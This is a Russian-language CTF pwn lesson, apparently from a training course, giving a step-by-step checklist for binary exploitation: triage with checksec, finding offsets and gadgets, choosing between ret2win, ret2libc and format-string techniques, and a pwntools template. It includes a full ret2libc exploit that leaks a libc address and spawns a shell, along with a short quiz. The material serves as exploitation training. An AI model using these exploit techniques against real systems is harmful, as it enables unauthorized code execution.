---
id: pwn-ctf-recipe
title: "Рецепты популярных CTF-задач: чек-лист по типам"
category: pwn
parent: pwn-methodology-realworld
difficulty: medium
order: 1
tags: [pwn, ctf, checklist, recipe, methodology]
prerequisites: [pwn-methodology, pwn-buffer-overflow]
useful_for:
  - "CTF Pwn — скорость решения"
  - "Тренировка навыков"
estimated_minutes: 55
summary: "Практическая библиотека рецептов: по сигнатурам задачи (checksec, тип бага, митигации) быстро выбрать рабочую технику и шаги эксплойта."
---
Этот урок — **универсальный рецепт** решения CTF-задачи категории pwn: последовательность шагов, которая в 90% случаев приводит от «дан бинарник» до флага или shell. Держите его как чек-лист: триаж → анализ уязвимости → определение примитивов → сборка эксплойта → отладка. Рецепт не заменяет понимание каждой техники (см. отдельные уроки), но задаёт правильный порядок действий и не даёт пропустить критичный шаг.

## Шаг 1. Триаж (2 минуты)

```bash
file ./chall                 # ELF 64-bit, PIE/non-PIE, stripped?
checksec --file=./chall      # RELRO, Canary, NX, PIE
./chall                      # запустить, посмотреть интерфейс/промпты
```

Что фиксируем сразу:

| Защита | Что означает для плана |
|--------|------------------------|
| No PIE | адреса бинаря фиксированы — гаджеты стабильны |
| PIE | нужна утечка базы бинаря (см. `pwn-pie-bypass`) |
| No canary | можно переполнять стек напрямую |
| Canary | нужна утечка canary (см. `pwn-canary-bypass`) |
| NX enabled | нельзя исполнять стек — ROP/ret2libc |
| NX disabled | можно шеллкод на стеке |
| Partial RELRO | GOT перезаписываем (GOT hijack) |
| Full RELRO | GOT read-only, но чтение GOT для утечки работает |

## Шаг 2. Разведка бинаря

```bash
readelf -h ./chall | grep -E 'Type|Entry'    # EXEC vs DYN
readelf -s ./chall | grep -iE 'win|flag|shell|system'  # интересные функции
strings -a ./chall | grep -iE 'flag|/bin/sh|win'
objdump -d -M intel ./chall | less           # найти main и уязвимую функцию
```

Ищите: функцию `win()`/`get_flag()` (тогда возможен ret2win), строку `/bin/sh`, вызовы `system`, `gets`/`read` без ограничения, `scanf("%s")`.

## Шаг 3. Анализ уязвимости

Типичные классы:

- **Stack overflow** — `gets`/`read`/`strcpy` в локальный буфер → перезапись RIP.
- **Format string** — `printf(user_input)` → произвольное чтение/запись.
- **Heap** — UAF, double-free, overflow (см. `pwn-heap-*`).
- **Integer overflow** — размер/индекс → обход проверок.
- **OOB** — чтение/запись вне границ массива.

Найдите путь к перезаписи: какой ввод, какой буфер, какое смещение.

## Шаг 4. Определение примитивов

- **Смещение до RIP.** `cyclic(200)` → крэш → `cyclic_find(0x616161...)`.
- **Управляемые регистры.** Какие значения попадают в RDI/RSI и т.п.
- **Гаджеты.** `ROPgadget --binary ./chall | grep 'pop rdi'`.
- **Утечки.** Есть ли `puts`/`printf`, возвращающие адреса (GOT).

```bash
ROPgadget --binary ./chall --only 'pop|ret' | head
ropper --file ./chall --search 'pop rdi'
```

## Шаг 5. Выбор техники

| Ситуация | Техника |
|----------|---------|
| Есть `win()` | ret2win (просто прыжок) |
| NX, нет PIE, есть libc | ret2libc (system) |
| Есть `syscall`/`int 0x80` | ret2syscall / ORW |
| Есть форматная строка | %n-запись в GOT |
| NX, no libc, static | ret2dlresolve / ret2csu |
| Heap-уязвимость | tcache/fastbin attacks |

## Шаг 6. Сборка эксплойта (pwntools)

```python
from pwn import *
context.binary = elf = ELF('./chall')
context.log_level = 'debug'
libc = ELF('./libc.so.6')

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

p = start()
OFFSET = 72
payload = flat({OFFSET: rop.chain()})
p.sendlineafter(b'>', payload)
p.interactive()
```

## Шаг 7. Отладка

```bash
python3 exp.py LOCAL GDB      # с attach
# или
gdb.attach(p, 'b *main+120\nc')
```

Типичные проблемы: неверный офсет, выравнивание стека (лишний `ret`), не та libc, неверный парсинг утечки, canary/PIE. Проверяйте пошагово в отладчике — где именно падает.

## Шаг 8. Стабилизация и remote

```python
# нестабильность: повторяем при провале
for _ in range(5):
    try:
        p = start(); exploit(p); break
    except EOFError:
        p.close()
```

Для remote: та же libc (или подберите через libc-database), те же офсеты. Учитывайте `LD_PRELOAD`/`ASLR` на сервере.

## Пример полного решения задачи

Дана задача: бинарник `chall`, non-PIE, NX, без canary, промпт `> `.

```text
1) checksec: NX enabled, No canary, No PIE, Partial RELRO.
2) readelf -s: есть символ main и функция vuln (не win).
3) objdump: vuln вызывает gets(buf) — классическое переполнение.
4) cyclic 200 -> RIP = 0x6161616c -> cyclic_find -> смещение 72.
5) ROPgadget: есть pop rdi; ret и ret.
6) Нет win() -> ret2libc: leak puts@got, вернуться в main, вычислить libc_base.
7) Round 2: system('/bin/sh').
8) Стабилизация: добавить ret для выравнивания -> interactive.
```

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6')
p = process('./chall')

# Round 1: leak
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p.sendlineafter(b'>', flat({72: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Round 2: shell
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendlineafter(b'>', flat({72: rop2.chain()}))
p.interactive()
```

Этот шаблон покрывает большинство «средних» pwn-задач. Адаптируйте офсеты и гаджеты под конкретную защиту.

## Шпаргалка команд

| Задача | Команда |
|--------|---------|
| Защиты | `checksec --file=./chall` |
| Тип ELF | `readelf -h ./chall \| grep Type` |
| Символы | `readelf -s ./chall` |
| Строки | `strings -a ./chall \| grep -iE 'flag\|/bin/sh'` |
| Дизасм функции | `objdump -d -M intel ./chall \| sed -n '/<main>:/,/ret/p'` |
| Смещение | `cyclic 200` / `cyclic_find(0x...)` |
| Гаджеты | `ROPgadget --binary ./chall` |
| Офсеты libc | `pwn libcdb` / `libc.symbols[...]` |
| Отладка | `gdb.attach(p)` |
| one_gadget | `one_gadget ./libc.so.6` |

## Продвинутые сценарии и куда смотреть

- **Format string.** Есть `printf(buf)` — считайте смещение до вашего буфера (`AAAA.%p.%p...`), затем используйте `%n` для записи (в GOT, return address). См. `pwn-format-string`.
- **Heap-задачи.** Уязвимость в malloc/free: tcache poisoning, fastbin dup, unsafe unlink, House of… См. `pwn-heap-*`, `pwn-tcache-*`.
- **Кernel.** Отдельный мир: `/dev/`-устройство, ioctl, UAF → ROP в ядре, обход SMEP/SMAP, ret2usr. См. `pwn-kernel-*`.
- **Без libc.** Static-бинарь → ret2syscall/ORW; musl → свои офсеты; `-static-pie` → свои причуды.
- **Exotic arch.** ARM/MIPS/RISC-V — другой ABI и гаджеты. См. `pwn-arm64-*`, `pwn-mips`, `pwn-riscv`.
- **sandbox/seccomp.** `seccomp-tools dump ./chall` покажет разрешённые syscalls — планируйте ORW.
- **Windows pwn.** Другой ABI, SEH, ASLR/CFG. См. `pwn-windows-*`.

Если базовый рецепт не срабатывает, определите, что именно мешает (защита/класс уязвимости), и переходите к соответствующему специализированному уроку — не перебирайте payload наугад.

## Частые ошибки

- **Пропустить checksec.** Защиты определяют весь план.
- **Угадывать офсет.** Только `cyclic_find`.
- **Забыть выравнивание.** Лишний `ret` перед `system`/SSE-кодом.
- **Не та libc.** Офсеты разные — определите версию.
- **Игнорировать отладчик.** Без него «слепой» подбор payload.
- **Не стабилизировать.** Remote-задача падает на 1-м прогоне — нужен retry.
- **Забыть про интерактив.** После shell — `p.interactive()`.

## Что делать дальше / решение

1. Триаж: `file`, `checksec`, запуск.
2. Разведка: символы, строки, дизасм, поиск `win`/`/bin/sh`.
3. Анализ уязвимости и смещения (`cyclic`).
4. Определение гаджетов и утечек.
5. Выбор техники по таблице защит.
6. Сборка и отладка эксплойта; стабилизация для remote.


## Финальные рекомендации по рецепту

Держите шаблон pwntools под рукой: `start()` (process/gdb/remote), функции-обёртки для меню, логирование адресов, `recvuntil` для синхронизации. Проходите чек-лист: `file`+`checksec` → поведение → `strings`/`nm` → поиск бага → примитив → эксплойт → стабилизация. Этот рецепт решает большинство CTF-задач; доведите его до автоматизма.


## Полный разбор рецепта на задаче

Применим рецепт к типичной задаче. Шаги: (1) `file ./chall; checksec ./chall` — определяем тип и митигации; (2) запускаем вручную — понимаем поведение (меню? ввод?); (3) `strings ./chall | grep -Ei "flag|/bin/sh|win"`; `nm ./chall | grep -Ei "win|system"` — ищем цели; (4) `objdump -d -M intel ./chall` — ищем уязвимую функцию (`gets`, `read`, `printf`); (5) выбираем примитив по митигациям (ret2win/ret2libc/format/heap); (6) пишем эксплойт по шаблону pwntools; (7) отлаживаем локально, стабилизируем, запускаем REMOTE. Логируем ключевые значения (`log.success`). Этот рецепт решает большинство CTF-задач; доведите его до автоматизма, чтобы не терять время на рутину. Держите шаблон и функции-обёртки под рукой.

## Разбор работы с меню и удалённым сервисом

Для задач с меню создайте функции-обёртки: `alloc(idx,size,data)`, `free(idx)`, `show(idx)`, `edit(idx,data)` — они делают эксплойт читаемым и упрощают изменения. Для удалённого сервиса используйте `remote(host, port)` и `recvuntil` для синхронизации вместо фиксированных задержек. Логируйте ключевые адреса (`log.success`). Стабилизируйте эксплойт: гоняйте в цикле, считайте успех, устраняйте нестабильность (выравнивание, гонки). Держите шаблон с `start()` (process/gdb/remote) и переключайтесь флагом (`args.REMOTE`/`args.GDB`). Этот workflow покрывает большинство задач и экономит время.


## Дополнительно

Ведите заметки по каждой задаче: митигации, offset, найденные гаджеты, адреса. Это ускоряет отладку и помогает при возврате к задаче. Сохраняйте эксплойты и шаблоны в одном месте. Дисциплина и повторение — ключ к скорости в CTF.


Практический совет: для быстрого триажа используйте `checksec --file`, `rabin2 -I`, и `one_gadget`; для автоматизации offset — `cyclic` и `cyclic_find`. Эти инструменты экономят минуты на каждой задаче, а в сумме — часы на соревновании.

## Квиз

```quiz
- question: "Какой рецепт применить при NX enabled, no PIE, есть win()?"
  options:
    - "ret2win — перезапись RIP на win()"
    - "FSOP"
    - "tcache poisoning"
    - "ORW"
  answer: 0
  explanation: "Готовая win() и отсутствие PIE/canary дают простейший ret2win."
- question: "Что делать при Full RELRO?"
  options:
    - "Целиться в .fini_array/exit/FSOP, а не в GOT"
    - "Писать в GOT"
    - "Снять canary"
    - "Отключить ASLR"
  answer: 0
  explanation: "GOT read-only, поэтому нужны другие цели записи."
- question: "Какой рецепт при seccomp с запретом execve?"
  options:
    - "ORW (open/read/write)"
    - "ret2libc"
    - "shellcode"
    - "ret2win"
  answer: 0
  explanation: "Без execve читают флаг через open/read/write."
- question: "С чего начинать триаж pwn-задачи?"
  options:
    - "С checksec и file (определить защиты)"
    - "С FSOP"
    - "С brute-force"
    - "С fuzzing"
  answer: 0
  explanation: "Защиты определяют выбор техники."
- question: "Что при printf(buf)?"
  options:
    - "Format string: утечки и запись"
    - "Heap overflow"
    - "Canary brute-force"
    - "ROP"
  answer: 0
  explanation: "Неконтролируемый формат — классическая format string."
```

## Где пригодится

- **CTF:** Pwn — быстрый выбор техники.
- **Bug bounty:** триаж нативных сервисов.
- **Пентест:** методология эксплуатации.
- **Работа:** exploit development.
